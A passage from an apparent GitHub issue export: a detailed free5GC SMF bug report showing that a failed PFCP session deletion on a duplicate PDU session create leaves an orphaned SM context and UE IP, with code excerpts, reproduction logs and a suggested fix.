- [PCF `AllocUeAppSessionId` — app-session ID is `<SUPI>-<n>`](https://github.com/free5gc/pcf/blob/22674cb4f8b428cd98b76568c8da42a2e23354b1/internal/context/ue.go#L443-L452) — `NFs/pcf/internal/context/ue.go` lines 443–452
- [PCF `SendAppSessionTermination` — reads the AF URL, sets `ResUri`, obtains a token](https://github.com/free5gc/pcf/blob/22674cb4f8b428cd98b76568c8da42a2e23354b1/internal/sbi/processor/policyauthorization.go#L1106-L1140) — `NFs/pcf/internal/sbi/processor/policyauthorization.go` lines 1106–1140
- [Generated client sets `Authorization: Bearer` on the outbound POST](https://github.com/free5gc/openapi/blob/f2b816c20b76022ea26a6df471bb34a4179cc555/client.go#L400-L409) — `free5gc/openapi` `client.go` lines 400–409

items.title: [Bugs]Duplicate SM context is never released when PFCP session deletion fails; each UE retry orphans one SMContext and one UE IP
items.body:
## Bug Description
On a duplicate PDU session create, `HandlePDUSessionSMContextCreate` calls `HandlePDUSessionSMContextLocalRelease` on the old context. That function releases it only in the `SessionReleaseSuccess` branch; `SessionReleaseFailed` and default set the state back to `Active` and return without releasing. It has no return value, so the caller creates a new context regardless, and `NewSMContext` overwrites `canonicalRef[supi-pduSessionId]` with the new UUID.

The old context stays in `smContextPool` and `seidSMContextMap`, holding a UE IP and four TEIDs, and is no longer reachable by SUPI and PSI. The AMF only ever learned the new UUID.

Trigger: PFCP session deletion fails while the UPF stays associated, and the UE retries the same PDU session. One orphan per retry.

The sibling function `HandlePDUSessionSMContextRelease` gets this right: its release sits after the switch and runs on every branch.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef` (and `seidSMContextMap` once PFCP context exists):

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps plus the UE IP and four TEIDs. Its only caller is `RemoveSMContextFromAllNF`:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

**Where it is skipped.** Only `SessionReleaseSuccess` reaches the release:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1352-L1385

```go
pfcpResponseStatus := releaseSession(smContext)

switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:
    ...
    p.RemoveSMContextFromAllNF(smContext, false)   // L1374: the only release

case smf_context.SessionReleaseFailed:
    smContext.SetState(smf_context.Active)         // L1378: no release

default:
    smContext.SetState(smf_context.Active)         // L1383: no release
}
```

A PFCP Session Deletion that times out yields `SessionReleaseFailed`, so that is the branch taken.

**Why nothing recovers it.** `LocalRelease` has no return value, so the caller creates a new context regardless and overwrites the lookup key:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L73-L78

```go
if dup_smCtx := smf_context.GetSMContextById(createData.Supi, createData.PduSessionId); dup_smCtx != nil {
    p.HandlePDUSessionSMContextLocalRelease(dup_smCtx, createData)
}

smContext := smf_context.NewSMContext(createData.Supi, createData.PduSessionId)
```

**The sibling function does it right.** Same switch, same statuses, but the release sits after it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1310

```go
switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:  ...
case smf_context.SessionReleaseFailed:   ...
default:                                 ...
}
p.RemoveSMContextFromAllNF(smContext, false)   // L1310: runs on all three
```

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, oauth off. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; the leaking code is untouched.

The UPF must be associated but unresponsive to deletion: a ~110-line UDP stub answers Association Setup, Heartbeat and Session Establishment (returning a UP F-SEID so the SMF installs the session), but ignores Session Deletion, so deletions time out to `SessionReleaseFailed`. No AMF is run, so an AM policy association is created once directly against the PCF, which is enough for the SM policy lookup to succeed; in a real network the AMF does this. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.)

A probe in the SMF runs `runtime.GC()` and reports the map sizes. Every request reuses `pduSessionId` 88, so `canonicalRef` cannot grow: `smContextPool - canonicalRef` is the orphan count.

**The leak, one retry:**

    attempt 1:  smContextPool 1, seidSMContextMap 1, canonicalRef 1   establishes normally (State→Active), 0 orphans
    attempt 2:  smContextPool 2, seidSMContextMap 2, canonicalRef 1   duplicate found, release failed, 1 orphan

What happened between them, at `level: trace`:

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed          <- L1377, so L1374 was skipped

`is deleted from pool` never appears. The context that attempt 1 established is still in the pool, and `canonicalRef` now points at attempt 2's UUID.

**Accumulation, 30 retries** — same SUPI, same PSI (`pduSessionId` 88), starting from a clean pool:

| n | smContextPool | seidSMContextMap | canonicalRef | orphans |
|---|---|---|---|---|
| 5 | 7 | 7 | 1 | 6 |
| 10 | 12 | 12 | 1 | 11 |
| 15 | 17 | 17 | 1 | 16 |
| 20 | 22 | 22 | 1 | 21 |
| 25 | 27 | 27 | 1 | 26 |
| 30 | 32 | 32 | 1 | 31 |

Slope exactly 1 per retry, no ceiling, unchanged by a forced `runtime.GC()`. `canonicalRef` pinned at 1 throughout, which is why the orphans are unreachable by SUPI and PSI.

    'In case SessionReleaseFailed'           30   deletion failed every retry
    'is deleted from pool'                    0   released nothing
    'Allocated UE IP address'                30   one new context per retry
    'Release IP'                              0   none returned

Attempt 1 is the control: no duplicate, so `LocalRelease` is never called and nothing leaks. Same endpoint, same payload, same code from attempt 2 on.

The default branch at L1380 has the same omission but was not reached in testing.

## Expected Behavior
`HandlePDUSessionSMContextLocalRelease` should release the old context on every branch of the switch — not only `SessionReleaseSuccess` — as the sibling `HandlePDUSessionSMContextRelease` does by placing `RemoveSMContextFromAllNF` after the switch (L1310). Otherwise a failed PFCP deletion leaves an orphaned context that the overwrite of `canonicalRef` makes permanently unreachable.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config, `oauth` off. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub that ignores Session Deletion.

## Walkthrough (Optional)
A PFCP Session Deletion that times out yields `SessionReleaseFailed`, which sets the state back to `Active` and returns without releasing (L1378).
